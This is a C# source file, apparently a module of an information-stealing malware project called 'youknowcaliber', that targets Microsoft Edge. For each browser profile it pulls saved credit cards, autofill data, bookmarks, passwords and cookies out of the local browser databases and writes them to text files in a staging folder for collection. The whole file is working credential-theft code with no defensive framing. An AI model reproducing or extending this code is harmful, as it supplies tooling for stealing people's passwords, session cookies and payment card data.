using System.IO;
using System.Collections.Generic;

namespace youknowcaliber.Edge
{
    internal sealed class Recovery
    {
        public static void Run(string sSavePath)
        {
            string sFullPath = Paths.lappdata + Paths.EdgePath;

            if (!Directory.Exists(sFullPath))
                return;

            string sBDir = sSavePath + "\\Edge";
            Directory.CreateDirectory(sBDir);
            foreach (string sProfile in Directory.GetDirectories(sFullPath))
            {
                if (File.Exists(sProfile + "\\Login Data"))
                {
                    // Run tasks
                    List<CreditCard> pCreditCards = Edge.CreditCards.Get(sProfile + "\\Web Data");
                    List<AutoFill> pAutoFill = Edge.Autofill.Get(sProfile + "\\Web Data");
                    List<Bookmark> pBookmarks = Edge.Bookmarks.Get(sProfile + "\\Bookmarks");
                    List<Password> pPasswords = Chromium.Passwords.Get(sProfile + "\\Login Data");
                    List<Cookie> pCookies = Chromium.Cookies.Get(sProfile + "\\Cookies");
                    //List<Site> pHistory = Chromium.History.Get(sProfile + "\\History");
                    // Await values and write
                    cBrowserUtils.WriteCreditCards(pCreditCards, sBDir + "\\CreditCards.txt");
                    cBrowserUtils.WriteAutoFill(pAutoFill, sBDir + "\\AutoFill.txt");
                    cBrowserUtils.WriteBookmarks(pBookmarks, sBDir + "\\Bookmarks.txt");
                    cBrowserUtils.WritePasswords(pPasswords, Help.ExploitDir + "\\Passwords.txt");
                    cBrowserUtils.WriteCookies(pCookies, sSavePath + $"\\Cookies_Edge({GenStrings.GenNumbersTo()}).txt");
                    //cBrowserUtils.WriteHistory(pHistory, sBDir + "\\");
                }
            }
        }
    }
}
